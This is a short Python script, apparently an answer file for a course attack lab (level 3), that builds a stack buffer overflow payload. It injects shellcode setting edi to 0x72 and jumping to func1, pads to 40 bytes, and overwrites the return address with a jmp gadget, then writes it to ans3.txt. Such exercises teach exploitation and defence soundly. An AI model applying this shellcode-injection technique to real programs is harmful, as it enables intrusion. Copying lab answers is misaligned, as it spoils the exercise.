# shellcode: 将0x72放入rdi，然后调用func1
shellcode = (
    b"\xbf\x72\x00\x00\x00" +      # mov edi, 0x72
    b"\x68\x16\x12\x40\x00" +      # push 0x401216 (func1地址)
    b"\xc3"                        # ret
)
padding = b"A" * (40 - len(shellcode))  # 填充到40字节
jmp_xs_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"   # jmp_xs地址：0x401334
payload = shellcode + padding + jmp_xs_addr

# 将payload写入ans3.txt文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload generated and saved to ans3.txt")
print(f"Payload length: {len(payload)} bytes")
print(f"Payload hex: {payload.hex()}")